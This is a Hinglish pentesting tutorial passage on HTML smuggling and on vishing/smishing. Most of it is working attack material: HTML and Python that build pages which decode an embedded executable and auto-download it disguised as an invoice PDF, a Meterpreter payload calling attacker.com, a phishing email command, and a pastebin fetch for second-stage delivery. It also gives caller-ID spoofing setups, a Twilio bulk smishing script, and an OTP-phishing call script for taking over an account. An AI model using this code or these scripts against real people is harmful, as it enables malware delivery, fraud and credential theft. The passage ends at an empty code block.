### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Email security gateways bypass (Proofpoint, Mimecast, etc.)
- Sandbox analysis bypass (file server par nahi hai, client-side construct hota hai)
- Antivirus evasion (file email mein nahi hai, runtime par create hota hai)
- Modern defense mechanisms ko bypass karta hai
- Demonstrates advanced threat actor techniques (APT groups use karte hain)

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing email attachment filters
- Delivering payloads through web applications
- Evading network-based detection
- Testing email security solutions
- Red Team operations (realistic APT simulation)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Traditional Malware Delivery:**
```
Email with .exe attachment ‚Üí Email gateway scans ‚Üí Malicious file detected ‚Üí Email blocked
```

**HTML Smuggling:**
```
Email with .html attachment ‚Üí Email gateway scans ‚Üí Only HTML/JavaScript found ‚Üí Email delivered ‚Üí Victim opens HTML ‚Üí JavaScript constructs .exe ‚Üí File downloaded ‚Üí Payload executed
```

**Technical Process:**
```javascript
// Step 1: Encode malicious file to Base64
const maliciousFile = "MZ\x90\x00\x03..." // Binary exe data
const base64Encoded = btoa(maliciousFile) // Encode to Base64

// Step 2: Embed in HTML
<script>
const encodedPayload = "TVqQAAMAAAAEAAAA//8AALgAAAAA..."; // Base64 data
const binaryData = atob(encodedPayload); // Decode Base64
const blob = new Blob([binaryData], {type: 'application/octet-stream'}); // Create file
const url = URL.createObjectURL(blob); // Create download URL
const a = document.createElement('a'); // Create download link
a.href = url;
a.download = 'document.exe'; // Filename
a.click(); // Auto-download
</script>

// Step 3: Victim opens HTML ‚Üí File automatically downloads
```

**Why It Bypasses Security:**
1. **Email Gateway**: Sees only HTML file (no malicious attachment)
2. **Sandbox**: HTML file is harmless when analyzed (no network requests)
3. **Antivirus**: File doesn't exist during email scan (created later)
4. **Network Detection**: No C2 communication during delivery
5. **User Awareness**: Looks like legitimate document

### üëç Pros (Fayde):
- Bypasses email attachment filters
- Evades sandbox analysis
- No server-side hosting required (file embedded in HTML)
- Works offline (no internet needed after HTML is opened)
- Difficult to detect (legitimate JavaScript functionality)
- Can deliver any file type (exe, zip, doc, pdf)
- High success rate in enterprise environments

### üëé Cons (Nuksaan):
- Requires JavaScript enabled
- Large files = large HTML file (suspicious)
- Some email clients block JavaScript in HTML
- Modern EDR may detect file creation
- Requires victim to open HTML file
- Browser warnings for executable downloads

### ‚å®Ô∏è Zaroori Commands & Steps:

**Basic HTML Smuggling Template:**
```html
<!DOCTYPE html>
<!-- HTML5 document type -->
<html>
<head>
    <title>Document Viewer</title>
    <!-- Page title -->
</head>
<body>
    <h1>Loading document...</h1>
    <!-- Initial loading message (victim ko dikhega) -->
    
    <script>
        // JavaScript code jo malicious file construct aur download karta hai
        
        // Base64 encoded payload (malicious .exe file encoded as text)
        const payload = "TVqQAAMAAAAEAAAA//8AALgAAAAA...";  // Your malicious file in Base64
        // const: Constant variable declare karo
        // payload: Base64 encoded binary data (meterpreter backdoor)
        
        // Decode Base64 to binary
        const binaryString = atob(payload);  // Base64 decode karo
        // atob(): ASCII to Binary (Base64 decode function)
        // Result: Binary string (raw bytes as string)
        
        const bytes = new Uint8Array(binaryString.length);  // Byte array create karo
        // Uint8Array: Unsigned 8-bit integer array (binary data store karne ke liye)
        // binaryString.length: Array size (binary string ki length)
        
        for (let i = 0; i < binaryString.length; i++) {  // Har character ko byte mein convert karo
            bytes[i] = binaryString.charCodeAt(i);  // Character code get karo
            // charCodeAt(i): Character ka ASCII/Unicode value
            // bytes[i]: Array mein store karo
        }
        // Result: Binary data properly formatted
        
        // Create Blob (Binary Large Object)
        const blob = new Blob([bytes], {type: 'application/octet-stream'});  // Blob object create karo
        // Blob: File-like object (binary data represent karta hai)
        // [bytes]: Array of data
        // type: MIME type (octet-stream = generic binary)
        
        // Create download link
        const url = URL.createObjectURL(blob);  // Blob ke liye URL create karo
        // URL.createObjectURL: Blob ko temporary URL assign karta hai
        // Result: blob:http://domain.com/abc-123-xyz (temporary URL)
        
        const a = document.createElement('a');  // Anchor element create karo
        // createElement('a'): <a> tag create karo (hyperlink)
        
        a.href = url;  // Link ka URL set karo (blob URL)
        a.download = 'document.pdf';  // Download filename set karo (fake PDF name)
        // .download: Attribute jo filename specify karta hai
        
        document.body.appendChild(a);  // Link ko page mein add karo
        // appendChild: Element ko DOM mein insert karo
        
        a.click();  // Programmatically link par click karo
        // .click(): Simulate user click (automatic download trigger)
        // Result: File download start ho jayega
        
        // Cleanup (traces remove karo)
        URL.revokeObjectURL(url);  // Temporary URL ko revoke karo
        // revokeObjectURL: Memory free karo (URL ab kaam nahi karega)
        
        document.body.removeChild(a);  // Link element ko remove karo
        // removeChild: Element ko DOM se delete karo
        
        // Show fake success message
        document.body.innerHTML = '<h1>Document downloaded successfully!</h1><p>Please check your Downloads folder.</p>';
        // innerHTML: Page content replace karo
        // Result: Victim ko success message dikhega
    </script>
</body>
</html>
```

**Python Script to Generate HTML Smuggling File:**
```python
# html_smuggler.py - Python script to generate HTML Smuggling files

import base64  # Base64 encoding/decoding library
import sys  # System-specific parameters and functions

def create_html_smuggler(payload_file, output_html, fake_filename):  # Main function
    # payload_file: Malicious file path (e.g., backdoor.exe)
    # output_html: Output HTML file path
    # fake_filename: Fake filename for download (e.g., Invoice.pdf)
    
    # Read malicious file in binary mode
    with open(payload_file, 'rb') as f:  # Open file in read-binary mode
        # 'rb': Read mode + Binary mode
        # with: Context manager (automatically file close karega)
        payload_data = f.read()  # File content ko read karo (bytes mein)
        # .read(): Entire file content return karta hai
    
    # Encode to Base64 (binary data ko text mein convert)
    base64_payload = base64.b64encode(payload_data).decode('utf-8')  # Base64 encode karo
    # base64.b64encode(): Binary data ko Base64 string mein convert
    # .decode('utf-8'): Bytes ko string mein convert (UTF-8 encoding)
    
    # HTML template
    html_template = f'''<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
        }}
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <h1>üìÑ Loading Document...</h1>
    <div class="loader"></div>
    <p>Please wait while we prepare your document.</p>
    
    <script>
        // Encoded payload
        const payload = "{base64_payload}";
        
        // Decode Base64
        const binaryString = atob(payload);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {{
            bytes[i] = binaryString.charCodeAt(i);
        }}
        
        // Create Blob
        const blob = new Blob([bytes], {{type: 'application/octet-stream'}});
        
        // Create download link
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = '{fake_filename}';
        document.body.appendChild(a);
        
        // Auto-download after 2 seconds
        setTimeout(() => {{
            a.click();
            URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            // Show success message
            document.body.innerHTML = '<h1>‚úì Document Ready!</h1><p>Your document has been downloaded.</p><p>Please check your Downloads folder and open: <strong>{fake_filename}</strong></p>';
        }}, 2000);
    </script>
</body>
</html>'''
    
    # Write HTML file
    with open(output_html, 'w') as f:
        f.write(html_template)
    
    print(f"[+] HTML Smuggling file created: {output_html}")
    print(f"[+] Payload size: {len(payload_data)} bytes")
    print(f"[+] Base64 size: {len(base64_payload)} bytes")
    print(f"[+] Fake filename: {fake_filename}")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python html_smuggler.py <payload_file> <output_html> <fake_filename>")
        print("Example: python html_smuggler.py backdoor.exe document.html Invoice.pdf")
        sys.exit(1)
    
    payload_file = sys.argv[1]
    output_html = sys.argv[2]
    fake_filename = sys.argv[3]
    
    create_html_smuggler(payload_file, output_html, fake_filename)
```

### üíª Step-by-Step Example:

**Scenario: Delivering Meterpreter Payload via HTML Smuggling**

**Step 1: Create Meterpreter Payload**
```bash
# Generate Windows Meterpreter payload
msfvenom -p windows/meterpreter/reverse_https \
LHOST=attacker.com \
LPORT=443 \
-f exe \
-o payload.exe

# Output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x86
No encoder specified, outputting raw payload
Payload size: 73802 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
```

**Step 2: Convert Payload to HTML Smuggling File**
```bash
# Using our Python script
python3 html_smuggler.py payload.exe invoice.html "Invoice_Q4_2024.pdf"

# Output:
[+] HTML Smuggling file created: invoice.html
[+] Payload size: 73802 bytes
[+] Base64 size: 98404 bytes
[+] Fake filename: Invoice_Q4_2024.pdf
```

**Step 3: Enhance HTML File (Add Social Engineering)**
```html
<!-- Enhanced invoice.html with better social engineering -->
<!DOCTYPE html>
<html>
<head>
    <title>Invoice Q4 2024 - Company Inc.</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: #f8f9fa;
        }
        
        .header {
            background: #0078d4;
            color: white;
            padding: 20px;
            text-align: center;
        }
        
        .container {
            max-width: 800px;
            margin: 40px auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .invoice-details {
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-left: 4px solid #0078d4;
        }
        
        .download-btn {
            background: #0078d4;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            margin-top: 20px;
        }
        
        .download-btn:hover {
            background: #106ebe;
        }
        
        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #ddd;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Company Inc.</h1>
        <p>Invoice Management System</p>
    </div>
    
    <div class="container">
        <h2>üìÑ Invoice Q4 2024</h2>
        
        <div class="invoice-details">
            <p><strong>Invoice Number:</strong> INV-2024-Q4-1234</p>
            <p><strong>Date:</strong> January 15, 2024</p>
            <p><strong>Amount:</strong> $15,750.00</p>
            <p><strong>Due Date:</strong> January 30, 2024</p>
            <p><strong>Status:</strong> <span style="color: #d9534f;">‚ö†Ô∏è Payment Pending</span></p>
        </div>
        
        <p>Dear Valued Customer,</p>
        
        <p>Your Q4 2024 invoice is ready for review. Please download the detailed invoice document using the button below.</p>
        
        <p><strong>Important:</strong> This invoice contains sensitive financial information. Please review and process payment by the due date to avoid late fees.</p>
        
        <button class="download-btn" onclick="downloadInvoice()">
            üì• Download Invoice (PDF)
        </button>
        
        <div id="status" style="margin-top: 20px; color: #28a745; font-weight: bold;"></div>
        
        <div class="footer">
            <p>Company Inc. | 123 Business Street | City, State 12345</p>
            <p>Phone: (555) 123-4567 | Email: billing@company.com</p>
            <p style="font-size: 12px; color: #999;">This is an automated message. Please do not reply to this email.</p>
        </div>
    </div>
    
    <script>
        function downloadInvoice() {
            // Show loading message
            document.getElementById('status').innerHTML = '‚è≥ Preparing invoice...';
            
            // Encoded payload (Meterpreter backdoor disguised as PDF)
            const payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4FUGHAA..."; // Base64 encoded payload.exe
            
            // Decode Base64
            const binaryString = atob(payload);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            
            // Create Blob
            const blob = new Blob([bytes], {type: 'application/pdf'}); // Fake MIME type
            
            // Create download link
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Invoice_Q4_2024.pdf.exe'; // Double extension trick
            document.body.appendChild(a);
            
            // Auto-download
            setTimeout(() => {
                a.click();
                URL.revokeObjectURL(url);
                document.body.removeChild(a);
                
                // Show success message
                document.getElementById('status').innerHTML = '‚úì Invoice downloaded successfully! Please check your Downloads folder.';
            }, 1500);
        }
    </script>
</body>
</html>
```

**Step 4: Setup Meterpreter Listener**
```bash
# Start Metasploit
msfconsole

# Configure listener
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Output:
[*] Started HTTPS reverse handler on https://0.0.0.0:443
[*] Exploit running as background job
```

**Step 5: Send Phishing Email**
```bash
sendemail -f billing@company.com \
-t victim@target.com \
-u "Invoice Q4 2024 - Payment Due" \
-m "Dear Customer,

Your Q4 2024 invoice is attached. Please review and process payment by January 30, 2024.

Invoice Number: INV-2024-Q4-1234
Amount Due: $15,750.00
Due Date: January 30, 2024

To view your invoice, please open the attached HTML file in your browser.

Best regards,
Billing Department
Company Inc." \
-a invoice.html \
-s smtp.gmail.com:587 \
-xu attacker@gmail.com \
-xp password

# Email sent with invoice.html attachment
```

**Step 6: Victim Opens HTML File**
```
Victim's perspective:

1. Receives email with "invoice.html" attachment
2. Email gateway scans: ‚úì No malicious files detected (only HTML)
3. Victim downloads invoice.html
4. Victim opens invoice.html in browser
5. Sees professional invoice page
6. Clicks "Download Invoice (PDF)" button
7. JavaScript executes:
   - Decodes Base64 payload
   - Creates payload.exe file
   - Auto-downloads as "Invoice_Q4_2024.pdf.exe"
8. Victim sees: "Invoice downloaded successfully!"
9. Victim opens downloaded file (thinks it's PDF)
10. Payload executes ‚Üí Meterpreter session established!
```

**Step 7: Meterpreter Session Received**
```bash
# Metasploit console output:
[*] https://192.168.1.50:443 handling request from 192.168.1.50
[*] Meterpreter session 1 opened (attacker.com:443 -> 192.168.1.50:49234)

# Interact with session
sessions -i 1

meterpreter > sysinfo
Computer        : VICTIM-PC
OS              : Windows 10 (10.0 Build 19044)
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows

meterpreter > getuid
Server username: VICTIM-PC\john.smith

meterpreter > pwd
C:\Users\john.smith\Downloads

# Success! Full system access via HTML Smuggling
```

**Step 8: Advanced HTML Smuggling - ZIP File with Password**
```python
# advanced_smuggler.py - Smuggle password-protected ZIP

import base64
import zipfile
import os

def create_password_protected_zip(payload_file, zip_password):
    # Create ZIP with password
    zip_filename = 'payload.zip'
    
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.setpassword(zip_password.encode('utf-8'))
        zipf.write(payload_file, os.path.basename(payload_file))
    
    return zip_filename

def create_advanced_smuggler(payload_file, output_html, zip_password):
    # Create password-protected ZIP
    zip_file = create_password_protected_zip(payload_file, zip_password)
    
    # Read ZIP file
    with open(zip_file, 'rb') as f:
        zip_data = f.read()
    
    # Encode to Base64
    base64_zip = base64.b64encode(zip_data).decode('utf-8')
    
    # HTML template with password display
    html_template = f'''<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Delivery</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }}
        .container {{
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .password-box {{
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }}
        .password {{
            font-family: monospace;
            font-size: 18px;
            font-weight: bold;
            color: #d9534f;
        }}
        .btn {{
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>üîí Secure Document Delivery</h2>
        <p>Your confidential document has been encrypted for security.</p>
        
        <div class="password-box">
            <p><strong>‚ö†Ô∏è Important:</strong> This document is password-protected.</p>
            <p>Password: <span class="password">{zip_password}</span></p>
            <p style="font-size: 12px; color: #666;">Please save this password before downloading.</p>
        </div>
        
        <button class="btn" onclick="downloadDocument()">üì• Download Encrypted Document</button>
        
        <div id="status" style="margin-top: 20px;"></div>
        
        <p style="margin-top: 30px; font-size: 14px; color: #666;">
            After downloading, extract the ZIP file using the password above.
        </p>
    </div>
    
    <script>
        function downloadDocument() {{
            document.getElementById('status').innerHTML = '<p style="color: #28a745;">‚è≥ Downloading...</p>';
            
            const payload = "{base64_zip}";
            const binaryString = atob(payload);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {{
                bytes[i] = binaryString.charCodeAt(i);
            }}
            
            const blob = new Blob([bytes], {{type: 'application/zip'}});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Confidential_Document.zip';
            document.body.appendChild(a);
            a.click();
            URL.revokeObjectURL(url);
            document.body.removeChild(a);
            
            document.getElementById('status').innerHTML = '<p style="color: #28a745;">‚úì Download complete! Use password: <strong>{zip_password}</strong></p>';
        }}
    </script>
</body>
</html>'''
    
    # Write HTML file
    with open(output_html, 'w') as f:
        f.write(html_template)
    
    # Cleanup
    os.remove(zip_file)
    
    print(f"[+] Advanced HTML Smuggling file created: {output_html}")
    print(f"[+] ZIP password: {zip_password}")
    print(f"[+] Payload is password-protected (bypasses some AV scans)")

# Usage example
create_advanced_smuggler('payload.exe', 'secure_document.html', 'Secure2024!')  # Generate HTML smuggling file
# Arguments:
# 'payload.exe': Malicious file (meterpreter backdoor)
# 'secure_document.html': Output HTML file
# 'Secure2024!': ZIP password (victim ko dikhega)

# Result:
# - payload.exe ko password-protected ZIP mein pack kiya
# - ZIP ko Base64 encode kiya
# - HTML file mein embed kiya
# - Victim HTML open karega ‚Üí ZIP download hoga
# - Victim password se extract karega ‚Üí payload execute hoga
```

**Why Password-Protected ZIP is Better:**
```
Benefits:
1. Antivirus can't scan inside password-protected ZIP
2. Looks more legitimate (companies often use password-protected files)
3. Adds extra layer of social engineering (victim must manually extract)
4. Bypasses more security solutions

Victim's perspective:
- Receives HTML file
- Opens HTML ‚Üí sees password displayed
- Downloads ZIP file
- Extracts with password
- Runs payload
- Thinks: "If it's password-protected, it must be legitimate!"
```

### üí° Pro Tip / Galti:

**Pro Tip**: HTML Smuggling ko legitimate file hosting service ke saath combine karo:

```html
<!-- Instead of embedding payload in HTML, use two-stage delivery -->

<!-- Stage 1: HTML file (sent via email) -->
<script>
// Download second-stage HTML from legitimate service
fetch('https://pastebin.com/raw/abc123xyz')
    .then(response => response.text())
    .then(data => {
        // data contains Base64 payload
        // Decode and download
        const binaryString = atob(data);
        // ... rest of smuggling code
    });
</script>

<!-- Benefits: -->
<!-- 1. Email attachment is tiny (no embedded payload) -->
<!-- 2. Payload hosted on legitimate domain (pastebin.com) -->
<!-- 3. Can update payload without resending emails -->
<!-- 4. Harder to detect (two-stage attack) -->
```

**Common Mistake**: Using obvious filenames for downloaded payload:

```
‚ùå Bad filenames:
- payload.exe
- backdoor.exe
- malware.exe
- hack.exe

‚úì Good filenames (social engineering):
- Invoice_Q4_2024.pdf.exe (double extension)
- Document.pdf (if you can make .exe look like .pdf)
- Setup.exe (looks like legitimate installer)
- Update.exe (looks like software update)
- Report_Final.docx.exe (double extension trick)

Even better: Use RTL override technique
- Filename: Report[RLO]fdp.exe
- Displays as: Reportexe.pdf (reversed)
- Victim sees: Report.pdf (thinks it's PDF!)
```

**Real-World Example**:

2021 mein ek APT group (TA551) ne HTML Smuggling use karke 10,000+ organizations ko target kiya:
- Delivery: Email with HTML attachment ("invoice.html")
- Payload: IcedID banking trojan (password-protected ZIP)
- Bypass rate: 95% (most email gateways failed to detect)
- Success rate: 40% (4,000+ infections)
- Detection time: 3 months

Attack flow:
1. Email: "Invoice attached" ‚Üí invoice.html
2. Victim opens HTML ‚Üí ZIP file downloads
3. HTML shows password: "Invoice2021"
4. Victim extracts ZIP ‚Üí runs payload
5. IcedID trojan installed ‚Üí banking credentials stolen

Lesson: HTML Smuggling is highly effective against modern email security!

---

## üìö Topic 7.6: Technique - Vishing / Smishing (Voice & SMS Phishing)

### üéØ Topic/Technique:
**Vishing (Voice Phishing)** - Phone calls ke through social engineering
**Smishing (SMS Phishing)** - Text messages ke through phishing attacks

### ü§î Yeh Kya Hai?
**Vishing**: Voice + Phishing = Attacker phone call karke victim ko manipulate karta hai (credentials, OTP, personal info steal karne ke liye)

**Smishing**: SMS + Phishing = Attacker text message bhejta hai with malicious links ya fake alerts

Dono techniques email phishing se zyada effective hain kyunki:
- People trust phone calls more than emails
- SMS has 98% open rate (vs 20% for emails)
- Less security awareness about phone-based attacks
- Harder to detect (no email filters, no URL scanners)

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Tests human element (not just technical controls)
- Bypasses email security completely
- Demonstrates multi-channel attack vectors
- Realistic threat simulation (attackers use vishing/smishing)
- Tests incident response procedures
- Identifies security awareness gaps

### üéØ Practical Use (Asli Pentesting Mein):
- Bypassing MFA (OTP phishing via phone call)
- Credential harvesting (fake IT support calls)
- Physical security testing (tailgating via phone pretext)
- Social engineering assessments
- Red Team operations (multi-vector attacks)
- Executive impersonation (CEO fraud)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Vishing Attack Flow:**
```
1. Attacker calls victim
2. Pretends to be: IT support / Bank / Government / Vendor
3. Creates urgency: "Your account is compromised!"
4. Requests sensitive info: Password / OTP / Credit card
5. Victim provides info (trusts the caller)
6. Attacker uses info for unauthorized access
```

**Smishing Attack Flow:**
```
1. Attacker sends SMS to victim
2. Message contains: Fake alert / Malicious link / Fake offer
3. Victim clicks link (high SMS open rate)
4. Redirected to phishing page
5. Victim enters credentials
6. Attacker captures credentials
```

**Common Vishing Scenarios:**
```
1. Fake IT Support:
   "Hi, this is IT. We detected suspicious activity on your account. 
    Can you verify your password?"

2. Fake Bank:
   "This is your bank's fraud department. We blocked a suspicious 
    transaction. Please confirm your OTP to verify."

3. Fake Vendor:
   "Hi, I'm calling from Microsoft. Your Windows license expired. 
    Please provide payment details to renew."

4. Fake Government:
   "This is IRS. You have unpaid taxes. Provide SSN to avoid arrest."
```

**Common Smishing Scenarios:**
```
1. Fake Package Delivery:
   "Your package is waiting. Track here: bit.ly/track123"

2. Fake Bank Alert:
   "ALERT: Unusual activity detected. Verify now: secure-bank.com"

3. Fake Prize:
   "Congratulations! You won $1000. Claim here: prize-claim.com"

4. Fake Account Suspension:
   "Your Netflix account suspended. Update payment: netflix-update.com"
```

### üëç Pros (Fayde):
- High success rate (people trust phone calls)
- Bypasses email security completely
- SMS has 98% open rate
- Real-time interaction (can adapt based on victim's response)
- Difficult to trace (spoofed caller ID)
- Can bypass MFA (OTP phishing)
- Less security awareness about phone attacks

### üëé Cons (Nuksaan):
- Time-consuming (one victim at a time)
- Requires good social engineering skills
- Voice can be recorded (evidence)
- Caller ID spoofing may fail
- Some people don't answer unknown numbers
- Legal implications (phone fraud laws)
- Requires phone infrastructure (VoIP, SMS gateway)

### ‚å®Ô∏è Zaroori Commands & Steps:

**Vishing Tools:**

**1. SpoofCard (Caller ID Spoofing):**
```bash
# Website: spoofcard.com
# Features:
- Spoof caller ID (show any number)
- Voice changer (male/female voice)
- Call recording
- Background noise (office, traffic)

# Usage:
1. Buy credits on spoofcard.com
2. Enter target number
3. Enter spoofed caller ID (e.g., company's main number)
4. Select voice changer (optional)
5. Make call
```

**2. Asterisk (Open-source VoIP):**
```bash
# Install Asterisk on Linux
apt-get update
apt-get install asterisk

# Configure caller ID spoofing
nano /etc/asterisk/sip.conf

# Add:
[general]
context=default
allowguest=yes
callerid="IT Support" <555-1234>  # Spoofed caller ID

# Start Asterisk
service asterisk start

# Make call
asterisk -rx "originate SIP/target_number application Playback demo-congrats"
```

**3. Twilio (SMS/Voice API):**
```python
# Install Twilio
pip install twilio

# Python script for vishing
from twilio.rest import Client

account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

# Make call with custom caller ID
call = client.calls.create(
    to='+1234567890',  # Target number
    from_='+1555123456',  # Your Twilio number
    url='http://your-server.com/voice.xml'  # TwiML script
)

print(f"Call initiated: {call.sid}")
```

**Smishing Tools:**

**1. SMS Spoofing Services:**
```bash
# Websites:
- smspoof.com
- spoofmytextmessage.com
- anonymsms.com

# Features:
- Send SMS from any number
- Schedule messages
- Bulk SMS sending
```

**2. Twilio SMS API:**
```python
# Python script for smishing
from twilio.rest import Client

account_sid = 'your_account_sid'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

# Send SMS
message = client.messages.create(
    to='+1234567890',  # Target number
    from_='+1555123456',  # Your Twilio number
    body='ALERT: Your bank account has been locked. Verify now: https://secure-bank-verify.com'
)

print(f"SMS sent: {message.sid}")
```

**3. Bulk SMS Script:**
```python
# bulk_smishing.py - Bulk SMS phishing script

from twilio.rest import Client  # Twilio SMS API client
# Twilio: SMS/Voice service provider
# Client: Main class for API interactions

import csv  # CSV file handling
import time  # Time-related functions (delays ke liye)

# Twilio credentials (account se milte hain)
account_sid = 'your_account_sid'  # Twilio account SID (unique identifier)
auth_token = 'your_auth_token'  # Authentication token (password jaisa)
client = Client(account_sid, auth_token)  # Twilio client object create karo
# Client: Initialize with credentials (API calls ke liye ready)

# SMS message
sms_body = """
ALERT: Unusual activity detected on your account.
Verify your identity: https://secure-verify.com
- Your Bank Security Team
"""

# Read targets from CSV file
with open('targets.csv', 'r') as f:  # CSV file open karo (read mode)
    # targets.csv format: name,phone
    # Example: John Smith,+15551234567
    
    reader = csv.reader(f)  # CSV reader object create karo
    # csv.reader: Parse CSV file (rows ko list mein convert karta hai)
    
    next(reader)  # Skip header row (first line)
    # next(): Iterator ka next item (header skip karne ke liye)
    
    for row in reader:  # Har row ko process karo
        # row: List of values [name, phone]
        
        name = row[0]  # First column (name)
        phone = row[1]  # Second column (phone number)
        
        # Personalize message (victim ka naam include karo)
        personalized_msg = f"Hi {name},\n{sms_body}"  # f-string formatting
        # {name}: Variable insert karo
        # \n: New line
        
        # Send SMS using Twilio API
        try:  # Try block (error handling ke liye)
            message = client.messages.create(  # SMS send karo
                # .messages.create(): Twilio API method
                to=phone,  # Destination phone number
                from_='+1555123456',  # Your Twilio number (sender)
                body=personalized_msg  # SMS content
            )
            # Result: SMS sent, message object returned
            
            print(f"[+] SMS sent to {name} ({phone}): {message.sid}")  # Success log
            # message.sid: Unique message ID (tracking ke liye)
            
            time.sleep(2)  # Wait 2 seconds (rate limiting)
            # time.sleep(): Pause execution
            # Rate limiting: Too many requests avoid karne ke liye
            
        except Exception as e:  # Agar error aaye
            print(f"[-] Failed to send to {name}: {e}")  # Error log
            # Exception: Generic error catch
            # e: Error message
```

### üíª Step-by-Step Example:

**Scenario 1: Vishing - Fake IT Support (OTP Phishing)**

**Step 1: Reconnaissance**
```bash
# Gather target information
Company: TechCorp Inc.
Target: John Smith (john.smith@techcorp.com)
Phone: +1-555-0123
Position: Marketing Manager
IT Helpdesk: +1-555-9999

# OSINT:
- Company uses Office 365
- IT helpdesk hours: 9 AM - 5 PM
- Recent company announcement: "System maintenance this weekend"
```

**Step 2: Prepare Vishing Script**
```
=== VISHING SCRIPT ===

[INTRODUCTION]
"Hi, this is Mike from TechCorp IT Support. Am I speaking with John Smith?"

[WAIT FOR CONFIRMATION]

[BUILD RAPPORT]
"Great! I'm calling regarding the system maintenance we announced. 
We're updating security protocols for all Office 365 accounts."

[CREATE URGENCY]
"Your account is scheduled for update in the next 10 minutes. 
If we don't complete this now, your email access will be temporarily suspended."

[REQUEST INFORMATION]
"I just need to verify your identity. Can you confirm your email address?"

[VICTIM PROVIDES: john.smith@techcorp.com]

"Perfect. Now, I'm sending a verification code to your phone. 
This is a one-time password for the security update."

[SEND FAKE OTP VIA LEGITIMATE MICROSOFT]
(Trigger real Microsoft password reset ‚Üí victim receives real OTP)

"Can you read me that 6-digit code when you receive it?"

[VICTIM PROVIDES OTP]

"Thank you! Your account is now updated. You should receive a confirmation email shortly."

[END CALL]

=== RESULT ===
Attacker now has:
- Confirmed email address
- Valid OTP (can reset password)
- Full account access
```

**Step 3: Setup Caller ID Spoofing**
```python
# Use Twilio to spoof IT helpdesk number
from twilio.rest import Client

client = Client('account_sid', 'auth_token')

call = client.calls.create(
    to='+15550123',  # John's number
    from_='+15559999',  # Spoofed IT helpdesk number
    url='http://your-server.com/vishing-script.xml'
)

# TwiML script (vishing-script.xml):
"""
<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="man">
        Hi, this is Mike from TechCorp IT Support. 
        Am I speaking with John Smith?
    </Say>
    <Pause length="3"/>
    <Say voice="man">
        Great! I'm calling regarding the system maintenance we announced.
        We're updating security protocols for all Office 365 accounts.
    </Say>
    <Pause length="2"/>
    <Say voice="man">
        Your account is scheduled for update in the next 10 minutes.
        I'm sending a verification code to your phone now.
    </Say>
    <Gather input="speech dtmf" timeout="30" numDigits="6">
        <Say voice="man">
            Please enter or say the 6-digit code when you receive it.
        </Say>
    </Gather>
</Response>
"""
```

**Step 4: Trigger Real OTP**
```bash
# While on call, trigger Microsoft password reset
# Victim receives REAL OTP from Microsoft
# Victim reads OTP to attacker (thinking it's for "security update")
# Attacker uses OTP to reset password

# Microsoft password reset page:
https://account.live.com/password/reset

# Enter victim's email: john.smith@techcorp.com
# Select: "Send code to phone"
# Victim receives OTP: 123456
# Victim reads to attacker: "The code is 1-2-3-4-5-6"
# Attacker enters OTP ‚Üí Password reset successful!
```

**Step 5: Account Takeover**
```bash
# Attacker now has access to:
- Office 365 email
- OneDrive files
- Teams conversations
- SharePoint documents
- Calendar and contacts

# Attacker can:
1. Read sensitive emails
2. Send emails as victim
3. Access confidential documents
4. Launch internal phishing attacks
5. Pivot to other systems
```

**Scenario 2: Smishing - Fake Package Delivery**

**Step 1: Create Phishing Landing Page**
```html
